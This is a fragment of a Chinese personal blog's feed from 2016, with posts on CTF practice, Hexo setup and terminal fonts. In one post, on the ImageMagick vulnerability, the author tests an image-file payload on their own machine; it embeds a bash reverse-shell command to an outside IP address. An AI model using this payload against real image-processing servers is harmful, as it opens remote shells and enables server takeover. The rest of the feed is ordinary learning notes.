+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=730631&auto=1&height=66"></iframe>
+
+
+
+
+
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;2016-05-19&quot;&gt;&lt;a href=&quot;#2016-05-19&quot; class=&quot;headerlink&quot; title=&quot;2016-05-19&quot;&gt;&lt;/a&gt;2016-05-19&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;del&gt;iOS小项目代码上传到GitHub&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;拿回手机&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;完善HEXO博客&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;查阅知网K-匿名论文&lt;/del&gt;&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="计划" scheme="http://hlzds.com/categories/%E8%AE%A1%E5%88%92/"/>
+    
+    
+      <category term="plans" scheme="http://hlzds.com/tags/plans/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ctf-tools</title>
+    <link href="http://hlzds.com/ctf-tools/"/>
+    <id>http://hlzds.com/ctf-tools/</id>
+    <published>2016-05-19T05:09:28.000Z</published>
+    <updated>2017-03-24T05:51:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><em>参考<a href="http://www.zhihu.com/question/30505597" target="_blank" rel="noopener">知乎/针对CTF，大家都是怎么训练的？</a>，未完待续</em><br><a id="more"></a></p>
+<h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul>
+<li><a href="http://www.atomsec.org/category/%E6%B8%B8%E6%88%8F/" target="_blank" rel="noopener">一个很有意思的博客，里面有CTF题解和黑客游戏</a></li>
+</ul>
+<hr>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;em&gt;参考&lt;a href=&quot;http://www.zhihu.com/question/30505597&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;知乎/针对CTF，大家都是怎么训练的？&lt;/a&gt;，未完待续&lt;/em&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="信息安全" scheme="http://hlzds.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="ctf" scheme="http://hlzds.com/tags/ctf/"/>
+    
+      <category term="tools" scheme="http://hlzds.com/tags/tools/"/>
+    
+      <category term="知乎" scheme="http://hlzds.com/tags/%E7%9F%A5%E4%B9%8E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ImageMagick-一次简单的漏洞利用</title>
+    <link href="http://hlzds.com/imageMagick-exp/"/>
+    <id>http://hlzds.com/imageMagick-exp/</id>
+    <published>2016-05-17T19:37:38.000Z</published>
+    <updated>2017-03-24T03:14:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h2><p>ImageMagick是一款处理图片的软件，很多网站的后台都在用。</p>
+<p><strong>在周二（不是昨天···），ImageMagick披露出了一个严重的0day漏洞，此漏洞<br>允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意<br>代码。Slack安全工程师Ryan Hube发现了这一0day漏洞。</strong></p>
+<p><em>上传一张图片，拿下一个网站（服务器）—-这不是在做梦！</em></p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>因为和小伙伴在做一个论坛，用的是WeCenter，放在SAE上，但发现上传不了图片了。加上看到了<a href="http://mp.weixin.qq.com/s?__biz=MjM5NzI0Njc2MA==&amp;mid=2664563189&amp;idx=1&amp;sn=a1296c113b53154796ee9318aa85daa7&amp;scene=1&amp;srcid=0516EwErJ9OEfzzfmuX8c2Gf#wechat_redirect" target="_blank" rel="noopener">新浪云最近对ImageMigick漏洞的处理</a>,所以有了玩玩这个漏洞的想法<br><a id="more"></a></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
+<li>随便一搜ImageMagick漏洞，就有很多poc和exp。我看的是<a href="http://www.tuicool.com/articles/bAzmUbZ" target="_blank" rel="noopener">这篇文章</a></li>
+<li>运行PoC没有问题╮(╯_╰)╭</li>
+<li>touch一个文件，改成txt，然后把下面这段代码抄进去，改成自己想测试的数据，然后后缀改成.jpg<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context  </span><br><span class="line">viewbox 0 0 640 480  </span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/103.21.140.84/7890 0&gt;&amp;1"</span>)'  </span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>重点来了！！</strong><br>我没敢日别人的站，就日自己电脑（这话是大神们教我的，总觉得好怪）把端口改成127.0.0.1，上面跑的有本地应用，然后开了一个端口监听，上传图片的时候就选择这张图片，<strong>然后一直显示正在上传~然后我的mac一点点升温！直到烫的不能用！</strong>要不是早点杀掉进程，估计我就被烫死了。。。这哪里是日站，简直就是物理攻击啊！我还一直以为黑客们的技能都是魔法伤害，这才刚接触就造成了这么大的物理伤害···</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>就顾得玩了，SAE的沙箱问题还没解决···先睡觉😪</p>
+<hr>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=2001320&auto=1&height=66"></iframe>
+
+
+
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;ImageMagick漏洞&quot;&gt;&lt;a href=&quot;#ImageMagick漏洞&quot; class=&quot;headerlink&quot; title=&quot;ImageMagick漏洞&quot;&gt;&lt;/a&gt;ImageMagick漏洞&lt;/h2&gt;&lt;p&gt;ImageMagick是一款处理图片的软件，很多网站的后台都在用。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在周二（不是昨天···），ImageMagick披露出了一个严重的0day漏洞，此漏洞&lt;br&gt;允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意&lt;br&gt;代码。Slack安全工程师Ryan Hube发现了这一0day漏洞。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;上传一张图片，拿下一个网站（服务器）—-这不是在做梦！&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;因为和小伙伴在做一个论坛，用的是WeCenter，放在SAE上，但发现上传不了图片了。加上看到了&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MjM5NzI0Njc2MA==&amp;amp;mid=2664563189&amp;amp;idx=1&amp;amp;sn=a1296c113b53154796ee9318aa85daa7&amp;amp;scene=1&amp;amp;srcid=0516EwErJ9OEfzzfmuX8c2Gf#wechat_redirect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;新浪云最近对ImageMigick漏洞的处理&lt;/a&gt;,所以有了玩玩这个漏洞的想法&lt;br&gt;
+    
+    </summary>
+    
+      <category term="信息安全" scheme="http://hlzds.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="ImageMagick" scheme="http://hlzds.com/tags/ImageMagick/"/>
+    
+      <category term="poc" scheme="http://hlzds.com/tags/poc/"/>
+    
+      <category term="exp" scheme="http://hlzds.com/tags/exp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ierm2+ohmyzsh-乱码</title>
+    <link href="http://hlzds.com/iterm2-ohmyzsh-luanma/"/>
+    <id>http://hlzds.com/iterm2-ohmyzsh-luanma/</id>
+    <published>2016-05-17T18:35:32.000Z</published>
+    <updated>2017-03-24T05:15:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p><strong>自从装上了iTerm2和ohmyzsh，一打开终端就会出现<code>口~口</code>，查阅多方得知，这只是个符号，不算是乱码，可以在<code>~/.zshrc</code>里面配置，但是我还是看着不爽🙊</strong></p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>参考了<a href="https://www.v2ex.com/t/184928" target="_blank" rel="noopener">V2EX的一篇文章</a>，通过评论区的另一个链接，<code>git clone</code>了powerline字体并安装，然后在如下：<br><a id="more"></a><br><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">Menu</span> Bar ▸ iTerm ▸ Preference ▸ Profiles</span><br><span class="line"> ▸ (Your Profile) ▸ <span class="keyword">Text</span> ▸ Regular <span class="keyword">Font</span> </span><br><span class="line">是否选择了 Powerline 字体。</span><br></pre></td></tr></table></figure></p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=149306&auto=1&height=66"></iframe>
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;自从装上了iTerm2和ohmyzsh，一打开终端就会出现&lt;code&gt;口~口&lt;/code&gt;，查阅多方得知，这只是个符号，不算是乱码，可以在&lt;code&gt;~/.zshrc&lt;/code&gt;里面配置，但是我还是看着不爽🙊&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;解决办法&quot;&gt;&lt;a href=&quot;#解决办法&quot; class=&quot;headerlink&quot; title=&quot;解决办法&quot;&gt;&lt;/a&gt;解决办法&lt;/h2&gt;&lt;p&gt;参考了&lt;a href=&quot;https://www.v2ex.com/t/184928&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;V2EX的一篇文章&lt;/a&gt;，通过评论区的另一个链接，&lt;code&gt;git clone&lt;/code&gt;了powerline字体并安装，然后在如下：&lt;br&gt;
+    
+    </summary>
+    
+      <category term="教程" scheme="http://hlzds.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+      <category term="iterm2" scheme="http://hlzds.com/tags/iterm2/"/>
+    
+      <category term="乱码" scheme="http://hlzds.com/tags/%E4%B9%B1%E7%A0%81/"/>
+    
+      <category term="ohmyzsh" scheme="http://hlzds.com/tags/ohmyzsh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>iscc2016-CTF实战</title>
+    <link href="http://hlzds.com/iscc-2016-basic/"/>
+    <id>http://hlzds.com/iscc-2016-basic/</id>
+    <published>2016-05-16T13:30:06.000Z</published>
+    <updated>2017-03-24T05:15:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="什么是CTF"><a href="#什么是CTF" class="headerlink" title="什么是CTF"></a>什么是CTF</h2><p><a href="http://hlzds.coding.me/2016/05/16/hacker-race-ctf/" target="_blank" rel="noopener">黑客的比赛——CTF</a></p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">虽然对信息安全感兴趣很久，也学了很多东西，但都是信马由缰。</span><br><span class="line">前几日一个很喜欢我的老师给我说了一个比赛，由北京理工大学举办</span><br><span class="line">的ISCC2016，还有老朋友信息安全保密协会。于是真的投身于这个</span><br><span class="line">大环境之下了~</span><br></pre></td></tr></table></figure>
+<h2 id="开战"><a href="#开战" class="headerlink" title="开战"></a>开战</h2><ul>
+<li>网址是<a href="http://iscc.isclab.org.cn" target="_blank" rel="noopener">ISCC2016</a>,谁都可以注册，线上赛时间是5.1到5.20（这两天已经有很多人通关了！！）</li>
+</ul>
+<p>首先做选择题吧，类似这样：(图床已经挂了。。)<br><img src="http://www.pichost.cn/viewpicture.php?id=e8519640bf784b7886762ccd8fb6ae2b" alt=""></p>
+<p>什么鬼！这不是计算机网络吗！也太基础了！但是我不会啊！难道还要翻书吗！我才不要！于是开始做关卡列表里的题~</p>
+<hr>
+<h3 id="第一题是这样："><a href="#第一题是这样：" class="headerlink" title="第一题是这样："></a><strong>第一题是这样：</strong></h3><p><img src="http://www.pichost.cn/viewpicture.php?id=3476710b5c1957e59ac5acc47a3911f5" alt=""><br>呵呵，哥哥搜了搜原理，直接心算——但算错了。于是只能写脚本了，但还是一直错= =于是找了一个叫CAP4的软件，可以直接加密解密，一下就出来结果了~</p>
+<hr>
+<a id="more"></a>
+<h3 id="第二题是这样："><a href="#第二题是这样：" class="headerlink" title="第二题是这样："></a><strong>第二题是这样：</strong></h3><p><img src="http://www.pichost.cn/viewpicture.php?id=752428d7de531668d244e2698b5d06b6" alt=""></p>
+<p>我的内心是崩溃的！！尼玛啊！冷静下来一分析，这绝逼是加密解密！因为每年的CTF基础题都是这样！刚下载的过去的writeup也是如此！但是到底是什么加密呢？一看有字母和数字，还有等于号，无非就那几种（自己搜···）后来确定是base64，但是解密之后还是乱码！根据前人的经验，我把解密结果反复再次解密，直到第十次，奇迹出现了！出来了一串单词！这里就不放结果了，自己试试~</p>
+<hr>
+<h3 id="第三题是这样的："><a href="#第三题是这样的：" class="headerlink" title="第三题是这样的："></a><strong>第三题是这样的：</strong></h3><p><em>可是点开这个链接什么都没有啊！</em><br><strong>但我总觉得，答案一定在这个页面！</strong><br>然后按了F12仔细看他的源码（这真是一个明智的决定）<br><em>高兴坏了！然而这个字符串却不是答案。。</em><br>==去你丫的，你才脚本小子，我是大黑客！==<br><strong>这么短，能是什么加密呢？经过分（cha)析(yue)得知，常见的加密方式无非就那几种（自己搜···），因为没有特殊符号，但是有数字，根据（前人的）经验，应该是移位，然后就写了这么一串程序来跑：</strong><br><strong>第一个Caesar.py是用来移位变换的，数字不变。第二个delSpace.cpp是用来删除python输出文件的空格的，我也不知道怎么让python不输出空格，只好又用一个程序来删，好傻（捂脸）</strong><br><strong>然后就一个答案一个答案地试啊，从头试一小半，再从尾试一小半，最后发现结果在中间。。。一个单词仿佛在嘲笑我最后才找到它···</strong></p>
+<hr>
+<h2 id="入门资料"><a href="#入门资料" class="headerlink" title="入门资料"></a>入门资料</h2><ul>
+<li><a href="http://iscc.gxu.edu.cn/index.php/Index/start" target="_blank" rel="noopener">广西大学计算机与电子信息学院-信息安全系</a></li>
+<li><a href="http://iscc.isclab.org.cn/study" target="_blank" rel="noopener">学习资料</a></li>
+</ul>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="386" height="86" src="http://music.163.com/outchain/player?type=2&id=29816800&auto=1&height=66"></iframe>
+
+
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;什么是CTF&quot;&gt;&lt;a href=&quot;#什么是CTF&quot; class=&quot;headerlink&quot; title=&quot;什么是CTF&quot;&gt;&lt;/a&gt;什么是CTF&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://hlzds.coding.me/2016/05/16/hacker-race-ctf/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;黑客的比赛——CTF&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;虽然对信息安全感兴趣很久，也学了很多东西，但都是信马由缰。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;前几日一个很喜欢我的老师给我说了一个比赛，由北京理工大学举办&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;的ISCC2016，还有老朋友信息安全保密协会。于是真的投身于这个&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;大环境之下了~&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&quot;开战&quot;&gt;&lt;a href=&quot;#开战&quot; class=&quot;headerlink&quot; title=&quot;开战&quot;&gt;&lt;/a&gt;开战&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;网址是&lt;a href=&quot;http://iscc.isclab.org.cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ISCC2016&lt;/a&gt;,谁都可以注册，线上赛时间是5.1到5.20（这两天已经有很多人通关了！！）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;首先做选择题吧，类似这样：(图床已经挂了。。)&lt;br&gt;&lt;img src=&quot;http://www.pichost.cn/viewpicture.php?id=e8519640bf784b7886762ccd8fb6ae2b&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;什么鬼！这不是计算机网络吗！也太基础了！但是我不会啊！难道还要翻书吗！我才不要！于是开始做关卡列表里的题~&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&quot;第一题是这样：&quot;&gt;&lt;a href=&quot;#第一题是这样：&quot; class=&quot;headerlink&quot; title=&quot;第一题是这样：&quot;&gt;&lt;/a&gt;&lt;strong&gt;第一题是这样：&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://www.pichost.cn/viewpicture.php?id=3476710b5c1957e59ac5acc47a3911f5&quot; alt=&quot;&quot;&gt;&lt;br&gt;呵呵，哥哥搜了搜原理，直接心算——但算错了。于是只能写脚本了，但还是一直错= =于是找了一个叫CAP4的软件，可以直接加密解密，一下就出来结果了~&lt;/p&gt;
+&lt;hr&gt;
+    
+    </summary>
+    
+      <category term="信息安全" scheme="http://hlzds.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="ctf" scheme="http://hlzds.com/tags/ctf/"/>
+    
+      <category term="iscc" scheme="http://hlzds.com/tags/iscc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>黑客的比赛——CTF</title>
+    <link href="http://hlzds.com/hacker-race-ctf/"/>
+    <id>http://hlzds.com/hacker-race-ctf/</id>
+    <published>2016-05-16T06:30:06.000Z</published>
+    <updated>2017-03-24T06:01:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="什么是CTF"><a href="#什么是CTF" class="headerlink" title="什么是CTF"></a>什么是CTF</h2><blockquote>
+<p>CTF全称Capture The Flag，即夺旗比赛，衍生自古代军事战争模式，两队人马前往对方基地夺旗，每队人马须在保护好己方旗帜的情况下将对方旗帜带回基地。在如今的计算机领域中，CTF已经成为安(hei)全(ke)竞赛的一种重要比赛形式，参赛选手往往需要组队参加，通过团队之间的相互合作使用逆向、解密、取证分析、渗透利用等技术最终取得flag。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="CTF比赛形式"><a href="#CTF比赛形式" class="headerlink" title="CTF比赛形式"></a>CTF比赛形式</h2><blockquote>
+<p>CTF夺旗赛通常有两种形式，解题模式（Jeopardy）和攻防模式（Attack-Defense）。</p>
+</blockquote>
+<blockquote>
+<p>在解题模式的比赛中，主办方会提供一系列不同类型的赛题，比如上线一个有漏洞的服务、提供一段网络流量、给出一个加密后的数据或经过隐写后的文件等，他们将 flag 隐藏在这些赛题中，选手们通过比拼解题来一决高下。</p>
+</blockquote>
+<blockquote>
+<p>在攻防模式比赛中，主办方会事先编写一系列有漏洞的服务，并将它们安装在每个参赛队伍都相同的环境中，参赛队伍一方面需要修补自己服务的漏洞，同时也需要去攻击对手们的服务、拿到对手环境中的 flag 来得分，攻防模式的竞赛往往比解题模式的竞赛更接近真实环境，比赛过程也更加激烈。</p>
+</blockquote>
+<h2 id="CTF常见题型"><a href="#CTF常见题型" class="headerlink" title="CTF常见题型"></a>CTF常见题型</h2><blockquote>
+<p>一般在CTF比赛中，会涉及MISC，PPC，CRYPTO，PWN，REVERSE，WEB，STEGA这几种题目</p>
+</blockquote>
+<blockquote>
+<p>MISC(miscellaneous)类型的题目比较杂乱，可能要分析数据，可能需要百度一下，还可能需要脑筋急转弯</p>
+</blockquote>
+<blockquote>
+<p>PPC(Professionally ProgramCoder)会考察一些编程类的题目</p>
+</blockquote>
+<blockquote>
+<p>CRYPTO是密码学，考察各种加解密技术，当然这和软件加密解密的REVERSE技术是两码事</p>
+</blockquote>
+<blockquote>
+<p>REVERSE指逆向工程</p>
+</blockquote>
+<blockquote>
+<p>PWN在黑客俚语中代表着，攻破，取得权限，多为溢出类题目</p>
+</blockquote>
+<blockquote>
+<p>STEGA(Steganography)会将flag隐藏到各种有码无码高清不高清的图片和音像制品中</p>
+</blockquote>
+<blockquote>
+<p>WEB题目不用多说，大家都懂的。。。</p>
+</blockquote>
+<blockquote>
+<p>以上科普内容转自<a href="http://ctf.idf.cn/" target="_blank" rel="noopener"></a>。同时该网站还提供了不少CTF的题目（CTF训练营），有兴趣的童鞋可以自行前往。</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;什么是CTF&quot;&gt;&lt;a href=&quot;#什么是CTF&quot; class=&quot;headerlink&quot; title=&quot;什么是CTF&quot;&gt;&lt;/a&gt;什么是CTF&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;CTF全称Capture The Flag，即夺旗比赛，衍生自古代军事战争模式，两队人马前往对方基地夺旗，每队人马须在保护好己方旗帜的情况下将对方旗帜带回基地。在如今的计算机领域中，CTF已经成为安(hei)全(ke)竞赛的一种重要比赛形式，参赛选手往往需要组队参加，通过团队之间的相互合作使用逆向、解密、取证分析、渗透利用等技术最终取得flag。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="信息安全" scheme="http://hlzds.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="ctf" scheme="http://hlzds.com/tags/ctf/"/>
+    
+      <category term="hacker" scheme="http://hlzds.com/tags/hacker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>用Hexo搭建网站</title>
+    <link href="http://hlzds.com/hexo-blog-setup/"/>
+    <id>http://hlzds.com/hexo-blog-setup/</id>
+    <published>2016-05-14T20:30:06.000Z</published>
+    <updated>2017-03-24T03:14:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><ul>
+<li>网上资料无穷尽，但还是推荐<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">官方文档</a></li>
+</ul>
+<h2 id="无数的坑"><a href="#无数的坑" class="headerlink" title="无数的坑"></a>无数的坑</h2><ul>
+<li>.yml文件，凡是冒号后面一定要跟空格，不然会出现各种奇怪死法</li>
+<li>如果node_modules里面的工具重复装，就会出现错误，这是需要删掉之后，重新<code>npm install</code>，如<code>npm install hexo-deployer-git --save</code></li>
+<li>hexo的结构我都快背下来了：_config.yml是主要配置文件，<code>/source/_posts</code>里面放的是.md文章，public放的是生成的网页，theme里面放的是主题（废话），node_modules里面放的是npm的工具，两个.json文件是数据库连接文件</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>_config.yml配置GitHub和Coding双线路岂止是有点坑···要在source目录下touch一个空白标志文件，要用<code>git -T git@coding.net</code>还有<code>git remote -u origin master</code>连接，复习了一遍git的高级用法···</li>
+<li>图标和LOGO分别放在主目录下的source目录和主题目录下的source/image目录（把里面能读的英文文档都读一遍，也就知道了）</li>
+<li><p>部署博客到线上：<code>hexo d -g</code>。但是我发现有个文件夹名字无论如何都是大写的，即使我在本地小写，但是使用这个命令push上去之后还是大写！后来查<code>npm_modules/hexo-deploy-git/</code>目录里的.md文档，发现了reset的方法：删掉一个隐藏的<code>.deploy</code>目录，然后重新生成就可以了</p>
+</li>
+<li><p>把主题的_config.yml里面的谷歌字体🈲了之后，加载速度<strong>飞快</strong>（3秒），之前将近10秒简直感人</p>
+</li>
+<li>本地调试<code>hexo s</code>访问localhost：4000.但是开VPN就进不了</li>
+<li><strong>······还有无数的坑，可能会从以下的链接得到解答，也可能不会</strong>==但是hexo真的很好玩啊==</li>
+<li>categories这选项点开一直不能用？先分别看看根目录和主题目录里面的_config.yml文件里面的category_dir路径打开了没（就是#去掉了没），然后<code>hexo new page categories</code>,进入source/categories,编辑.md文件，类似这样：</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">title:</span> categories</span><br><span class="line"><span class="string">date:</span> <span class="number">2015</span><span class="number">-10</span><span class="number">-20</span> <span class="number">06</span>:<span class="number">49</span>:<span class="number">50</span></span><br><span class="line"><span class="string">type:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="string">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a href="http://wdxtub.com/2016/01/05/hexo-github-site/" target="_blank" rel="noopener">小土刀的博客-静态博客 Github 并存指南</a></p>
+<p><a href="http://iread.io/2015/09/hexo-guide-4/" target="_blank" rel="noopener">Hexo系列教程: (四)将独立域名与GitHub Pages的空间绑定</a></p>
+<p><a href="http://httpbin.com.cn/%E5%88%A9%E7%94%A8hexo%E7%8E%A9%E8%BD%ACcoding-pages/" target="_blank" rel="noopener">利用Hexo玩转Coding pages</a></p>
+<p><a href="http://note.leodev.me/" target="_blank" rel="noopener">leo的博客</a>速度好慢啊</p>
+<p><a href="http://theme-next.iissnan.com/third-party-services.html" target="_blank" rel="noopener">各种好玩的工具</a></p>
+<p><a href="http://shomy.top/2016/03/03/hexo-in-coding-github/" target="_blank" rel="noopener">hero同时部署到coding(gitcafe)和github</a></p>
+<p><a href="http://daxiawj.github.io/2014/05-14-Hexo-%E4%B8%80%E9%94%AE%E7%BE%A4%E5%8F%91-Hexo-Batch-Deploy.html" target="_blank" rel="noopener">Hexo 一键群发_Hexo Batch Deploy</a></p>
+<p><a href="https://github.com/hexojs/hexo/issues/1927" target="_blank" rel="noopener">git优先账户</a>到底先用哪个git账户？可以在.ssh/config里配置</p>
+<p><a href="https://segmentfault.com/q/1010000002561642" target="_blank" rel="noopener">hexo分类和标签设置</a></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
+<li>绑定独立域名</li>
+<li>使用swifty搜索栏、访问统计、图床等工具</li>
+<li>CDN优化速度</li>
+<li>精准定位</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;headerlink&quot; title=&quot;开始&quot;&gt;&lt;/a&gt;开始&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;网上资料无穷尽，但还是推荐&lt;a href=&quot;https://hexo.io/zh-cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方文档&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;无数的坑&quot;&gt;&lt;a href=&quot;#无数的坑&quot; class=&quot;headerlink&quot; title=&quot;无数的坑&quot;&gt;&lt;/a&gt;无数的坑&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;.yml文件，凡是冒号后面一定要跟空格，不然会出现各种奇怪死法&lt;/li&gt;
+&lt;li&gt;如果node_modules里面的工具重复装，就会出现错误，这是需要删掉之后，重新&lt;code&gt;npm install&lt;/code&gt;，如&lt;code&gt;npm install hexo-deployer-git --save&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;hexo的结构我都快背下来了：_config.yml是主要配置文件，&lt;code&gt;/source/_posts&lt;/code&gt;里面放的是.md文章，public放的是生成的网页，theme里面放的是主题（废话），node_modules里面放的是npm的工具，两个.json文件是数据库连接文件&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="教程" scheme="http://hlzds.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+      <category term="hexo" scheme="http://hlzds.com/tags/hexo/"/>
+    
+      <category term="blog" scheme="http://hlzds.com/tags/blog/"/>
+    
+      <category term="os" scheme="http://hlzds.com/tags/os/"/>
+    
+      <category term="course" scheme="http://hlzds.com/tags/course/"/>
+    
+  </entry>
+  
+</feed>
